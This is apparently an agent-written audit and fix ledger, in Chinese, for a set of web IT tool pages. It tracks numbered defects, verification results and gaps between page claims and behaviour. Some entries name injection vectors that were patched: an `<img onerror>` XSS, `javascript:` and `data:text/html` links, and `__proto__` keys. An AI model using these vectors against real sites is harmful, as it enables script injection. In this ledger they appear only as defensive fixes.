- `text-to-ascii`（文本转 ASCII）：IT-N181–N184 已于第220批真修并销账。N181 参照表错的 TAB 行 `9(制表)|57|39` 改为数字 `9|57|39`、删重复 A 行（补 `Z=90/5A`），控制字符 TAB/LF/CR 单列成表（data-zh 双语）；N182 `for(const c of s)` + `codePointAt(0)` 按码点遍历，1 个 emoji 只跳过 1 次；N183 十六进制 `padStart(2,'0')`，换行 10 由 `0xA` 改 `0x0A`，公式说明中英同步；N184 导出改为现场生成逐字符四列 CSV（字符/十进制/十六进制/二进制，含 CSV 转义），不再导历史表，空输入清空结果缓存避免导出旧表。改输出格式同批同步 `scripts/verify_it_calc.js` 的 `0xA`→`0x0A` expect（新页+旧 expect 实测 1553/1554 红，证明必须同步）。JSDOM `scripts/_verify_it_batch220.mjs` 修好版 24/24、旧源码差分 9/20；verify 1554/1554、deepdive sync 0 不一致。
- `shell-script-formatter`（Shell 脚本格式化）：IT-N185–N190 已于第221批收口。N185 进批真机探测发现 `minifyShell()` 已由其他 Agent 改为「逐行 trim + 删空行、保留换行、heredoc 正文原样」、不再插入 `; `，属清单漏销账（`&&` 续行 / else / case / heredoc 四组输出交 `bash -n` 均通过）；本批顺带加固 heredoc 探测——改在 `shellCode()` 剥离引号/注释后的代码上判定，字符串字面量 `"a <<EOF"` 不再误触发。N186–N189 真修 `formatShell()`：新增 `shellCode()` 统一剥离引号、转义与行内注释；case 分支模式收紧为「仅 case 块内 + 行首到 `)` 无空白/引号/括号且 `)` 是行尾」（`echo $(date)`、`arr=(1 2 3)` 不再漂移）；单独成行的 `then`/`do` 与 `else`/`elif` 只回落本行、不再额外开层；`}` 与 `fi/done/esac`、`;;` 一律本行减级；heredoc 起始行参与当前缩进、body 原样保留。N190 真修 `doValidate()`：按剥离后代码统计关键字与括号、跳过 heredoc 正文，统计写入状态栏（`white-space:pre-line` + 通过态 `err ok` 绿色）且绝不覆盖 `#output`。公式说明中英三源同步。JSDOM `scripts/_verify_it_batch221.mjs` 修好版 44/44（含 `bash -n` 实算与历史/表格/CSV 全链路、状态链），旧源码差分 23/44（21 项红，N185 压缩主断言在旧页仍全过 ⇒ 印证漏销账）；verify 新增 3 条强锁 1557/1557、判别逃生 1 + 跳过 1 为基线、audit 0 僵尸、deepdive sync 0 不一致。
- `unit-converter-advanced`（高级单位转换器）：IT-N191–N195 已于第222批收口。进批探测：N193（`ucFmtNum` 已有科学计数分支）与 N195（`nm:1e-9` / `nmi:1852`）已由其他 Agent 修好，属漏销账；但 N193 只留 3 位有效数字（`1.16e-10`），本批提到 6 位（`1.164153e-10`），并把 ≥1e15 的大值也纳入科学计数（旧 `toFixed(6)` 会把 1 J→eV 输出成 19 位伪精度整数 `6241509074460763136`，违反「禁 ≥15 位有效数字」）；N195 本批补 `um:1e-6`。N191 真修：`normTempUnit()` 把 ℃ / °C / ℉ / °F / 小写统一归一到 C/F/K，预设「温度 ℃」从被拒变为 100℃ → 212.00°F / 373.15K，归一后的 from 参与目标卡去重。N192 真修：补 `pressure`（pa/kpa/mpa/bar/psi/atm/torr/mmhg）与 `energy`（j/kj/mj/cal/kcal/wh/kwh/btu/ev）两张因子表 + 两个下拉项，因子取国际约定 / 2019 SI 定义值（1 atm = 101325 Pa、1 psi = 6894.757293168 Pa、1 Torr = 101325/760 Pa、1 cal = 4.184 J、1 BTU_IT = 1055.05585262 J、1 eV = 1.602176634e-19 J），`js/tool-i18n-en.js` GEN_UI_MAP 补「压强」英译。N194 真修：`val` 空/非有限值不再 `isNaN?0` 静默换算，改为提示「请输入有效数值」；新增 `escTxt()` 让 `cat`/`from` 进结果区前转义（修掉裸 `<img onerror>` 注入），并用 `hasOwnProperty` 挡住 `__proto__` 原型链键；`</div` 未闭合已由其他 Agent 修好，补证据。三条动态结果串与 result-title 共用 `isEn` 双语，EN 态零 CJK；公式说明中英三源同步。JSDOM `scripts/_verify_it_batch222.mjs` 修好版 39/39（含 lbf/in²、cal、BTU 独立复算，输出→历史→表格→CSV 全链路，状态链，EN 态），旧源码差分 9/39（30 项红，N193/N195 核心断言旧页仍过 ⇒ 印证漏销账）；verify 新增 7 条强锁 1564/1564、判别逃生 1 + 跳过 1 为基线、audit 0 僵尸、deepdive sync 0 不一致。
- `html-entities-encode`（HTML 实体编解码）：IT-N196–N198 已于第223批收口。进批探测：N196（`fromCp` 已校验 0–0x10FFFF 且排除代理区）与 N197（已改纯文本替换、不再用 `div.innerHTML`）均由其他 Agent 修好，属漏销账，本批补真机证据；N198 真修——旧实现用「文本里是否含带分号实体」做总开关，仅有 `&amp` / `&#65` 时一个都不解、混合写法结果依赖上下文，改为单次纯文本扫描 `/&(?:#(\d+)|#x([0-9a-fA-F]+)|([a-zA-Z]+))(;?)/g` 统一出口：带分号一律解，无分号数字实体按 HTML5 解、无分号命名实体只解 legacy 子集（amp/lt/gt/quot/nbsp/copy/reg），表外实体与 `AT&T` 原样保留；单次 replace 杜绝 `&amp;lt;` 二次解码。顺带修「真实入口漏包装」：`dec()` 原先未接历史/明细表/趋势/CSV（只包装了 `enc`），现同型包装。公式说明补解码规则并中英三源同步。JSDOM `scripts/_verify_it_batch223.mjs` 修好版 35/35、旧源码差分 23/35（12 项红，N196/N197 旧页全过 ⇒ 印证漏销账）；verify 新增 4 条强锁 1568/1568、判别逃生 1 + 跳过 1 为基线、audit 0 僵尸、deepdive 0 不一致。注：工具名/meta 的「完整编解码」与 `NAMED` 仅 39 条属 Q 批专项承诺条目，改动牵涉 SEO 标题/JSON-LD/面包屑，本批未动、仍留在「承诺 vs 实际」专项段。
- `json-to-toml`（JSON 转 TOML）：IT-N199–N201 已于第224批收口。进批探测：N199 键名引用（`tomlKey()` 按 `[A-Za-z0-9_-]+` 判裸键，否则 `JSON.stringify`）与 N201 的 null / 对象标量混排数组报错均已由其他 Agent 修好，属漏销账，本批补真机证据。N200 真修：`toToml(v, prefix, depth, unit)` 接收缩进串并逐层 `unit.repeat(depth)`，2 空格 / 4 空格 / Tab 三档产出不同、Tab 为真 0x09，表数组 `[[...]]` 与压缩转换同样生效，缩进只改排版不改语义；顺带删掉重复注入的一组同名函数（`getIndent`/`setOut`/`setErr`/`clearAll`/`loadSample` 各留一份），修掉「成功提示也被标红」——`setErr` 成功/空态给 `err ok` 绿、失败态给 `err` 红。N201 真修：新增 `tomlDateLiteral()`，严格 ISO 8601 的 date / datetime / time 按 TOML 原生日期类型输出裸值（保留小数秒与偏移、空格分隔归一为 T、月日与时分秒先做范围校验），不合格与普通字符串仍双引号转义，兑现页面「支持 ISO 日期字符串」的宣称。公式说明中英三源同步（键名引用 / 缩进 / ISO 日期）。JSDOM `scripts/_verify_it_batch224.mjs` 修好版 36/36、旧源码差分 18/36（18 项红，N199 与 null/混排数组旧页全过 ⇒ 印证漏销账）；verify 新增 4 条强锁 1572/1572、判别逃生 1 + 跳过 1 为基线、audit 0 僵尸、deepdive 0 不一致。**踩坑**：该页 en JSON 有两个同前缀「递归转换」中文键（短 151 字 / 长 215 字），用短键做子串替换会把页面长公式污染成「新文案 + 旧后半段」；正确做法是从 `git show HEAD:` 恢复 map 顺序、只替换长键并把 formula-eq 整块设为纯新文案，短键原样保留。

### 承诺 vs 实际（Q 批专项）
- `tools/it/ksuid-generator.html:479`：英文简介"20-byte random payload"，实现 16 字节（281-282）；同段"27-character"但 hex 选项输出 40 字符（170、267-269）。
- `tools/it/calc-3.html:123`、`:187`：承诺 `#RGB` 简写与 8 位 alpha，`hexToRgb` 只收 6 位（238），`maxlength=7`（136）连 8 位都输不进。
- `tools/it/matrix-transpose.html:175`：按钮"导出明细 CSV"实际导历史表（413-415），无 Aᵀ 结果。
- `tools/it/http-cookies.html:169`：英文承诺 parse/build Set-Cookie 头，页面无解析器（仅 171 搜索 + 静态 `COMMANDS`）。
- `tools/it/text-to-ascii.html:102`：承诺十六进制"两位"，实际 1 位（221）；`:119` 按钮"导出明细 CSV"实为历史表（327）。
- `tools/it/shell-script-formatter.html:214`：FAQ"仅调整空白、不改行为"，但「压缩」插入 `;` 并对 `&&`/`|`/case/heredoc 产出非法脚本（323-325）。
- `tools/it/unit-converter-advanced.html:108`：承诺"压强与能量"两类，下拉与因子表均无（118、222-230）。
- `tools/it/html-entities-encode.html:141`、`:10`：标题/meta"完整编解码"，`NAMED` 仅 39 条（257-269），`&alpha;`/`&hearts;` 解码原样返回（307）。
- 备注：`html-entities-encode` 的「导出明细 CSV」（431）与数据表恒空，属 `textarea` + `*ResText()` 读 `textContent` 的 IT-N140 模板缺陷，本批不重复编号；同页 `:317` 复制依赖全局 `event`，与 IT-N31 同模式，不重复计数；`calc-3.html:139-140`、`ksuid-generator` 等页面加载即写一条历史，属历史模板行为，未单列。

### 覆盖
- 实读 8 页：`tools/it/ksuid-generator.html`、`tools/it/calc-3.html`、`tools/it/matrix-transpose.html`、`tools/it/http-cookies.html`、`tools/it/text-to-ascii.html`、`tools/it/shell-script-formatter.html`、`tools/it/unit-converter-advanced.html`、`tools/it/html-entities-encode.html`。
- 新增 32 条（高 2 / 中 18 / 低 12），编号 IT-N167~IT-N198。
- 未覆盖说明：只审计主流程、边界与文档口径，未逐条核对 FAQ/JSON-LD 文案，未检查同模板其它 IT 页；`html-entities-encode` 的"完整实体覆盖"仅按 `NAMED` 表条目数与解码行为核对，未穷举 2000+ HTML5 命名实体。
- 未做验证：未开浏览器（结论均为源码静态分析 + `node -e` 内存复算，Shell 压缩另用 `bash -n` 校验）、未验证英文态 `?lang=en-US`/繁体/移动端、未跑 `_test_static.py`/`_audit_links.py`/`_audit_assets.py`/`run_gates.py` 等门禁，未触发 `_build.py` 或任何 git 写操作。
- 第225批销账：IT-N202–N206（`plist-parser` real/date/data 保型与超安全整数与大整数往返与控制字符剔除、`char-encoder` ASCII 行按码点与清空清字节视图），详见下方覆盖行。
- 第226批销账：IT-N207–N211（`char-encoder` 常用 HTML 实体补全、`basic-auth-generator` 冒号校验与 UTF-8 charset 提示；N210 历史不写密码与 N211 复制提示已由其他 Agent 修好补证据），详见下方覆盖行。
- 第227批销账：IT-N212–N216（`nanoid-generator` 大字母表拒绝采样/emoji 码点/历史取值、`markdown-table-generator` 反斜杠转义与编辑期不写回），详见下方覆盖行。
- 第228批销账：IT-N217–N221（`markdown-table-generator` CSV 双引号逗号解析、`wifi-qr-generator` 改名「配网字符串生成器」；N218/N219 转义与字段顺序、N221 残缺 div 已由其他 Agent 修好补证据），详见下方覆盖行。

### 承诺 vs 实际（Q 批专项）
- `tools/it/json-to-toml.html:10`、`:20`：宣称支持"ISO 日期字符串"，实际 `:271` 对所有字符串加引号，日期不会输出为 TOML 日期（见 N201）。
- `tools/it/json-to-toml.html:172`："校验"按钮（`:321` `doValidate(){doToml();}`）只是再转换一次，不校验 TOML 语法，也不校验 JSON 语义（如重复键、超大数）。
- `tools/it/json-to-toml.html:177-180`：缩进下拉与 `:439` Tab 预设无输出效果（见 N200）。
- `tools/it/plist-parser.html:10`、`:164`：宣称支持 date/data，实际 `:273-274` 只取文本、`:283` 回写为 string（见 N202）。
- `tools/it/char-encoder.html:174`：格式清单列出 **Punycode**，但 `:280` 起的 `formats` 数组与全文件均无 Punycode 实现/输出行（新增发现，未单列编号）。
- `tools/it/nanoid-generator.html:194`：写"21 字符约 122 位熵"，而 `:227`/`:246` 写 126 位；64 字符表下 21×6=126 bit，`:194` 数值错误（"约 4 年"沿用官方 350M ID/s 口径，按 126 位成立）。
- `tools/it/markdown-table-generator.html:154`："导出明细 CSV"（`:418`）导的是历史表，且 `:339-345` 读取 `#output`（textarea）的 `textContent` 恒为空，历史/图表/导出实际无数据——属 IT-N140 模板缺陷，不重复编号。
- `tools/it/wifi-qr-generator.html:103`：宣称"任何扫码 App 都能识别"；但 `:235-236` 不转义特殊字符（N218），隐藏网络字符串还缺 `;;`（N219），且 `:175` 与 `:110` 对"是否需要转义"自相矛盾。
- `tools/it/wifi-qr-generator.html:83`、`:103`、`:105`：页面名为"二维码生成器"、简介称"生成二维码"，实际不生成 QR（N220）。
- `tools/it/phone-screen-sizes.html:16`：宣称"输入参数即可实时得出结果"，但全页无 `input` 监听，只有"计算"按钮 `onclick`（`:147` 附近），属文案夸大（未单列）。
- `tools/it/basic-auth-generator.html:8`：宣称"支持中文用户名"，实际 UTF-8 编码但不声明 charset，ISO-8859-1 服务端会乱码（N209）。
- 通用：本批 8 页"导出明细 CSV"均为历史表导出（如 `json-to-toml.html:433`、`markdown-table-generator.html:418`），不导出当前结果；未单列编号。

### 覆盖
- 实读 8 页：`tools/it/json-to-toml.html`、`tools/it/plist-parser.html`、`tools/it/char-encoder.html`、`tools/it/basic-auth-generator.html`、`tools/it/nanoid-generator.html`、`tools/it/markdown-table-generator.html`、`tools/it/wifi-qr-generator.html`、`tools/it/phone-screen-sizes.html`。
- 新增 26 条（高 2 / 中 17 / 低 7），编号 IT-N199~IT-N224；本批无重号（上一批止于 IT-N198）。
- 未覆盖说明：只审计主流程、边界与文档口径，未逐条核对 FAQ/JSON-LD 文案（仅发现 `phone-screen-sizes` 描述整句重复并单列）；未穷举 plist 全部数据类型、未测试二进制 bplist00（页面已明确不支持）；WiFi QR 未实际扫码验证；屏幕参数表仅复算 PPI 与分辨率/尺寸自洽性，未核对 10 款机型官方规格的发布时间与市场版本。
- 未做验证：未开浏览器（结论均为源码静态分析 + `node -e` 内存复算）、未验证英文态 `?lang=en-US`/繁体/移动端、未跑 `_test_static.py`/`_audit_links.py`/`_audit_assets.py`/`run_gates.py` 等门禁，未触发 `_build.py` 或任何 git 写操作。

- `binomial-distribution`：无剩余缺陷（IT-N241 n 上限 10000 + `Number.isInteger` 校验 + cdf 对数域递推 O(n)、IT-N242 大组合数对数形式 e^{ln C} + 注记、IT-N243 引据表阈值统一 ≥5，三条均已销账，第196批；verify 3 条强锁 + JSDOM 真机 20/20、旧源码 11/20，cdf 递推 9 组独立复算 maxErr 3.4e-12）。
- 留存建议（tools/it/binomial-distribution.html）：正态近似可补连续性校正 `z=(k−np±0.5)/√(np(1−p))` 说明。

- `go-cheatsheet`：无剩余缺陷（IT-N244 6 处非法 `--` 注释全改 `//`、IT-N245 8 处裸 `...` 占位与 2 处未使用变量空循环体改为可编译片段，两条均已销账，第197批；verify 2 条探针强锁 + JSDOM 真机 20/20、旧源码 6/20，30 条 example 静态 Go 规则全清、合法 `...T`/`[...]T`/`./...` 保留）。

### 承诺 vs 实际（R 批专项）
- `tools/it/rabbit.html:201`："导出明细 CSV"导的是 `#rabbitTable`，而 `:441-443` 读 `#output`（**textarea**）的 `textContent`，textarea 的 textContent 是初始内容（恒空）→ 历史/图表/CSV 恒空（IT-N140 同型，不重复编号）。
- `tools/it/rest-api-cheatsheet.html:558` 错误格式 syntax 非法 JSON（N236）；`:221` "POST 建"指向 `/users/{id}`（N237）。
- `tools/it/md5.html:201`：称"支持任意大小文件"，但 `:338`/`:375` 的 `tail[14]=n*8` 只写低 32 位、未给高位字 `tail[15]` 赋值 → ≥512 MiB 文件摘要错误；且 `:417-426` 用 `readAsArrayBuffer` 全量读入内存，"任意大小"不成立。
- `tools/it/md5.html:47`、`:606`：宣称"支持批量生成""MD5 碰撞检测参考"，实际无批量与碰撞功能（N240）。
- `tools/it/binomial-distribution.html:176-178`：三个输入无上限/无小数校验（N241）；`:171` `≥5` 与 `:254` `>5` 冲突（N243）。
- `tools/it/go-cheatsheet.html:341` 等 5 处 `--` 注释（N244）、`:365` 等 7 处 `...` 占位与未使用变量（N245），与"可复制示例"的定位冲突。
- 通用：本批 5 页的"导出明细 CSV"（`tools/it/rabbit.html:201`、`tools/it/sms-qr.html:165`、`tools/it/hypothesis-test.html:181`、`tools/it/md5.html:191`、`tools/it/binomial-distribution.html:181`）导的都是历史表而非当前结果；其中 rabbit 的历史源文本取自 textarea 的 `textContent`，恒为空。

### 覆盖
- 实读 8 页：`tools/it/rabbit.html`、`tools/it/mysql-cheatsheet.html`、`tools/it/sms-qr.html`、`tools/it/hypothesis-test.html`、`tools/it/rest-api-cheatsheet.html`、`tools/it/md5.html`、`tools/it/binomial-distribution.html`、`tools/it/go-cheatsheet.html`。
- 新增 21 条（高 4 / 中 10 / 低 7），编号 IT-N225~IT-N245；本批无重号（上一批止于 IT-N224）。
- 未覆盖说明：只审计主流程、参数边界与文档口径，未逐条穷举 MySQL/Go 语法（仅抽检 GRANT、`INT[(M)]`/`ZEROFILL`、`VALUES()`、`--`、`...`）；Rabbit 未做官方向量比对（缺 RFC 4503 期望值，只证明了"进位/密钥装入偏离本页说明"）；sms-qr 未实际扫码；binomial 参数域抽样到 n=20000；rest-api/mysql 内容准确性对照 RFC 9110/9457 与 MySQL 8.0 手册，非逐条穷举。
- 未做验证：未开浏览器、未构建、未跑门禁、未 git 写；全部结论为源码静态分析 + `node` 内存复算（临时脚本在 `/tmp`，未落仓库），未验证英文态 `?lang=en-US`/繁体/移动端。

- `binary-to-text`：无剩余缺陷（IT-N246 结果读取统一走 textarea.value + 删除以错误词判空的启发式，历史/表格/图表/CSV 链恢复；IT-N247 严格 UTF-8 `fatal:true,ignoreBOM:true` + 非法字节计数/Latin-1 对照/0x 字节列表；IT-N248 FAQ 与公式三源口径纠正，三条均已销账，第198批；verify 3 条探针强锁 + JSDOM 真机 21/21、旧源码 6/21，非法字节/BOM/错误词评分/三源文案全变红）。

- `chinese-name-generator`：无剩余缺陷（IT-N249 拆 maleChars 双字词条建/志/华 + generateOneName 复姓避让、逐字符拼接、字数兜底断言，2字名/3字名字数精确；IT-N250 getCharPool 出口 Set 去重，薇/素/毅不再放大取样；IT-N251 取消收藏 toast 补 toast.fav_removed key + 中文兜底，不再空提示，三条均已销账，第199批；verify 3 条探针强锁 + 1 条结构例改造 + JSDOM 真机 18/18、旧源码 3/18，verify 用例级旧态 1551/1554 三锁全红）。

- `regex`：IT-N253 分享链接 base64url 对称修复（写入 +→- /→/ 去尾=，读取逆变换并兼容旧标准 base64 的空格化 +、补 padding，catch 加 console.warn），中文/换行 payload 往返正确，第200批销账；verify 无用例（页面依赖原生 location.hash + btoa/atob，harness stub DOM 不适用），由 JSDOM 真机 12/12 vs 旧5/12 覆盖。IT-N252（ReDoS 超时 + flags 双绑定）已于第201批整条销账。 IT-N254（替换页尊重用户 flags，非 g 只替首个且 count 按命中数、copyMatches global 跟随 flags 防 1001 条重复）第202批销账；真机 14/14 vs 旧 6/14（8 项变红）。

- `device-info`：IT-N255 item() 加第4参 raw（仅内部可信 badge 串跳过转义），在线状态/网络状态两处 status-badge 不再显示为裸标签，第203批销账；普通/外部值仍走 escapeHtml 不回退安全。verify 无用例（依赖 navigator/screen 原生对象），真机 8/8 vs 旧 1/8。 IT-N256（__v 从恒定核心数改视口面积，趋势/对比有真实变化，新增「视口」字段+字典英译）、IT-N257（复制全部改为逐条 label: value 换行、UA 单独成块）第204批销账；真机 9/9 vs 旧 2/9。

- `qrcode`：IT-N258 中文/emoji UTF-8 编码（generate() 切 qrcode.stringToBytes 到 UTF-8、__qrBytes 按 UTF-8 计字节含 emoji 代理对）源码已在 HEAD（其他 Agent 修复），清单漏销账，第205批补证据销账；真机 13/13（库编码对照标准 UTF-8、__qrBytes 一致、中文/ASCII 矩阵不同、缺陷态对照切换项变红），verify 无用例。N259（宣称识别但无解码）等仍留清单。

- `qrcode`：IT-N259 SEO 宣称口径（title/h1/keywords/meta/JSON-LD/intro 全部只宣称「生成」无「识别/解析/上传图片解析」，无 file input/解码入口）源码已在 HEAD（其他 Agent 修复），清单漏销账，第206批补证据销账；真机 14/14（缺陷态注入旧宣称 11/14），verify 无用例。N260（容量图只到v10）等仍留清单。

- `qrcode`：IT-N260 容量表 QR_BYTE_CAP 补到 v40（用本页 js/qrcode.js 二分实测各版字节容量，与库实际编码口径一致，v40 L=2953 与表注吻合），超限标 41=超出v40 不再错误压成10；第207批销账；真机 19/19 vs 旧 4/15项红（300/900字节各级别版本与库实际生成一致），verify 无用例。后续条目仍留清单。

- `hex-encode`：IT-N261 解码改为先剥分隔符、再全局 `replace(/0x/gi,'')`（每行/每字节 0x 的 hexdump 都能解，大小写 0X 兼容），编码侧勾选 prefix 时按字节加（`0x48 0x69`）；IT-N262 历史读取 F-N189 全站修复已覆盖（`#output` 是 textarea，现读 `r.value`），本批删掉 `__hex_encodeScore` 关键词判 0 启发式（恒 1，与 N246 同型，避免 "Error 404"/严格解码告警被误判无效）；IT-N263 改严格 UTF-8（`fatal:true,ignoreBOM:true`）+ 非法字节计数/Latin-1 对照/原始 hex 字节列表，`dec` 也包进 extras 并写「模式=编码/解码」，历史回放按方向选 `enc()`/`dec()`；第208批销账；真机 25/25 vs 旧 9/25（16 项红），verify 无用例（依赖 TextEncoder/TextDecoder 原生对象）。后续条目仍留清单。

- `xml-to-yaml`：IT-N264（textarea 初值塞深潜 CSS/被吞 `</body>`）与 IT-N265（数组套对象输出 `[object Object]`）源码已由其他 Agent 修好且在 HEAD，清单漏销账，本批补真机证据（初值 187 字符/10 行、无 CSS、深潜容器在 textarea 外、首屏干净 YAML；嵌套数组递归输出 `d: "1"` 无 `[object Object]`）；IT-N266 真修：属性正则补单引号 `(?:"([^"]*)"|'([^']*)')`、标签头 `>` 查找加 findGt 跳过引号内字符、以 @/# 开头的键过 `yKey()` 加双引号（YAML 1.2 保留指示符/注释，加引号不影响 XML 往返）；顺带修 indent 承诺（dumpYaml 加 unit 参数，root 传空前缀、每层递增 unit，2 空格→首层 2 空格，4 空格/tab 同样对齐）。同页 en JSON 更新两条中文键/英译并清理 N264 遗留的旧深潜示例键。第209批销账；真机 22/22 vs 旧 10/22（12 项红；N264/N265 共 5 项旧态已绿如实记录），verify 无用例。承诺 vs 实际段其余项仍留清单。

- `json-schema-generator`：IT-N267 required 不再无条件收键——null 字段跳过（否则「必填且只能为 null」让任何真实响应校验失败），数组元素的多个对象取共有键（mergeSchemas 顺带保留 required），说明文案改为「单样本推断、多样本需人工合并」；IT-N268「描述注释」勾选框从死控件变成真输出 `description: 'The <key> field.'`（保留预设「描述+极值+标题」的承诺）；IT-N269 混合类型不再退化空 schema，输出去重后的 `anyOf` 且树视图同步展示；顺带修 `isIPv4` 逐段 0-255 + 拒前导零（999/256/01 段不再误标 ipv4）。en JSON required 说明键/英译同步。第210批销账；真机 21/21 vs 旧 6/21（15 项红），verify 无用例。承诺 vs 实际段其余项仍留清单。

### 承诺 vs 实际（R 批专项·8 页）
- `tools/it/qrcode.html:299`："最高版本 40 约存 2953 字节（数字模式）"——2953 是**字节模式**容量（数字模式为 7089 位），与同页 `:559` 的正确表注自相矛盾。
- `tools/it/qrcode.html:11`、`:80-81`、`:169`、`:629`：宣称"识别/解析上传图片"，实际只有生成（N259）；`:629` 还多打了一个句号"。。"。
- `tools/it/regex.html:345`、`:374`：建议用"原子组/独占量词"规避灾难性回溯——JS RegExp 两者都不支持（该建议只对 PCRE 有效），而本页正是 JS 正则测试器；且页面自述"应设超时保护"却未实现（N252）；`:654` 分享链接（N253）、`:599` 替换强制全局（N254）。
- `tools/it/xml-to-yaml.html:415-417` + `:404-405`：`indent` 选"2 空格"时首层实际 4 空格、二层 6 空格（root 传 `pad+'  '` 而 `pad` 已是 2 空格），与缩进控件承诺不符；`:209` 把 `@`/`#text` 当推荐约定（N266）；`:151` 的 FAQ 说"同名重复元素转成数组"，但单次出现时仍输出标量（`:288`、`:291-293`），形状随样本数变化。
- `tools/it/json-schema-generator.html:656-667`："验证"按钮只做 `JSON.stringify`（对普通对象不会失败），并未校验 Schema 合法性；`:500-501` `isIPv4` 不校验 0–255，`999.999.999.999`、`256.0.0.1`、`01.2.3.4` 都被标 `format:"ipv4"`（node 实测三条全 true）；`:464-476` 合并对象数组时重建 `{type,properties}`，丢掉 `required`。
- `tools/it/binary-to-text.html:203`：FAQ 关于空格/尾组的说明与实现相反（N248）；`:386` 导出的是从未填充的 `#binary_to_textTable`（N246）。
- `tools/it/hex-encode.html:284`：勾选前缀只在整串首加一个 `0x`（`0x4869`），与"每字节 0x"的常见约定不同（N261）；`:421-423` 只包 `enc`，解码不进历史（N263）。
- `tools/it/device-info.html:608-613`："复制全部信息"粘连无分隔（N257）；`:333-335` iPadOS 13+ 桌面模式 UA 只含 `Macintosh`/`Mac OS X` → 会判成 "macOS + 桌面设备"（待验证，本机无 iPad）；`:339-348` `isTouch` 取 `'ontouchstart' in window || maxTouchPoints>0`，两者可矛盾（显示"支持 (0 点)"，待验证）。
- `tools/it/regex.html` 历史只在点"常用正则"卡片时记录（`:814-816` 包装的 `applyPreset`，而 `:760` 的历史回放调 `applyPreset()` 无参 → 抛 TypeError 被吞），直接输入正则不记录；TBKit 预设条点击走 `preset.bar(n,list)` 的空参 `after`（`:812`、`js/tool-kit.js:1042-1053`）→ `applyPreset(undefined)` 抛 TypeError 被 try/catch 吞掉，toast 与历史都不生效（结果因 `setValue` 派发 `input` 事件仍会刷新）。
- 通用：本批 8 页的"导出明细 CSV"里，`binary-to-text`、`hex-encode` 两页导的是恒空的历史表（N246/N262）；`qrcode`、`device-info`、`chinese-name-generator` 的导出只在真正产生记录后才有效，无记录时无任何提示。
- 通用（隐私口径）：`device-info` 页声称"所有数据仅在浏览器本地显示，不会上传"，源码中确无 `fetch/sendBeacon`（`js/analytics.js`、`js/metrics.js` 亦无网络调用），但模板 `:73` 左右统一注入第三方 `lf1-cdn-tos.bytegoofy.com` push.js（拿到完整 DOM 权限）——"不上传"应限定为"表单数据不上传"，或移除该第三方脚本。

### 覆盖
- 实读 8 页：`tools/it/binary-to-text.html`、`tools/it/chinese-name-generator.html`、`tools/it/regex.html`、`tools/it/device-info.html`、`tools/it/qrcode.html`、`tools/it/hex-encode.html`、`tools/it/xml-to-yaml.html`、`tools/it/json-schema-generator.html`（另读了 `js/qrcode.js`、`js/common.js`、`js/tool-kit.js` 的相关片段）。
- 新增 24 条（高 5 / 中 15 / 低 4），编号 IT-N246~IT-N269；本批无重号（上一批止于 IT-N245）。
- 未覆盖说明：只审计主流程、边界与文档口径，未逐条穷举 8 页全部输入域（binary/hex 只测分隔符、长度、非法 UTF-8/BOM 与 `0x` 前缀；regex 只测 ReDoS 计时、分享链接往返、强制 g 与 1000 条上限，未逐条验证所有 flag 组合与 `u`/`v` 语义；qrcode 只验证编码字节、容量估算与导出参数，未实际扫码；xml 用页面自身函数跑 6 组用例，未覆盖命名空间/CDATA 嵌套；schema 只验证 required/anyOf/描述/ipv4/验证按钮）。姓名池统计已全量（两池各 100 项），但未统计真实重名率（跨批不查重）。
- 未做验证：未开浏览器、未构建、未跑门禁、未 git 写；结论为源码静态分析 + `node` 内存复算（临时脚本 `/tmp/audit_xml.js`、`/tmp/audit_name.js`，未落仓库）；未验证英文态 `?lang=en-US`、繁体与移动端；`IT-N251`（toast 文案）与 `device-info` 的 iPad/触摸两项标为待验证。

- `markdown-editor`：IT-N288 属性注入 XSS 与 IT-N289 GFM 任务清单源码已修好（`escAttr` + `safeUrl` 协议白名单、`- [x]` → 禁用复选框），清单及开头待办漏销账，本批补真机安全回归证据（alt 引号不闭合属性、`javascript:`/`data:text/html` 拦截、`data:image` 与正常链接放行、任务清单 checked 语义）；IT-N290 真修：`#` 由 `<h2>` 改为 `<h1>`（CommonMark 一级标题语义，`##`/`###`/`####` 不变），工作原理公式说明与 en JSON 中文键/英译同步。第211批销账；真机 16/16 vs 旧 13/16（3 项红均为 N290，N288/N289 旧态已绿如实记录），verify 4 条相关用例均不依赖 h2、无需改 expect。

### 承诺 vs 实际（S 批专项）
- `tools/it/gitignore-generator.html:172`、`:382`：承诺忽略/输出 `.env`，8 个模板 29 条规则中无 `.env`（N270，**已于第269批修复**：8 模板统一追加 .env/.env.*/!.env.example）；`:111` 写"按语言、框架与编辑器选择模板"，实现 `:217-226` 只有 8 个语言/IDE 栈，无任何框架模板；`:344` 的"默认参数"实际全选 8 项（N271）。
- `tools/it/phone-qr.html:201`、`:197`：承诺"使用标准 tel: URI，主流扫码器均支持/扫码唤起拨号"，实际生成随机噪点图、无数据编码与纠错（N273）；`:158` 承诺剥离全部空白，实际仅在补 `tel:` 时剥离（N274）。
- `tools/it/protobuf-parser.html:161`、`:204-205`：承诺解析二进制结构与抓包排查 gRPC，实现只有 `.proto` 文本转 JSON（N278）；`:415` 的"校验"只数括号（N277）；`:290-305` 不支持 `map<...>`（N276）；`:12` 的 meta 口径（.proto→JSON）与正文自相矛盾。
- `tools/it/hmac-generator.html:219`：FAQ 把"编码不一致"列为签名失败主因，实际密钥固定按 UTF-8 文本编码、输出只有 hex（N280）；`:151` 的"输出长度=摘要长度"描述正确，无问题。
- `tools/it/a1z26-cipher.html:147` 承诺非字母原样保留、`:149` 承诺越界视为非法，实际全部丢弃/静默跳过（N282、N283）。
- `tools/it/numeronym-generator.html:397` 承诺"结果展示缩写与各字母间字符数还原"，实际只有 `词 → 缩写` 对照、没有还原功能；`:193` 写"通常 7 字母以上才用"，`:262` 却对所有 ≥3 字母词生效（N286）。
- `tools/it/markdown-editor.html:527` 承诺"必须过滤内嵌 HTML，防止 XSS"，实际无任何净化且存在属性注入（N288）；`:521` 写"# 与 ## 均输出 h2"，与 CommonMark h1 语义不符（N290）；`:582` 的"任务清单"预设不支持 task list（N289）。
- `tools/it/clamp-calculator.html:169` 示例"320–1280px、16–24px：clamp(16px, 1rem+0.625vw, 24px)（约在 320px=16、1280px=24）"——按页面 `:275-278` 同参数实际生成 `clamp(16px, 2.5vw + 16px, 24px)`，320px 得 24px、≥320px 后一直被 max 截断，示例与算法不符（N291）。

### 覆盖
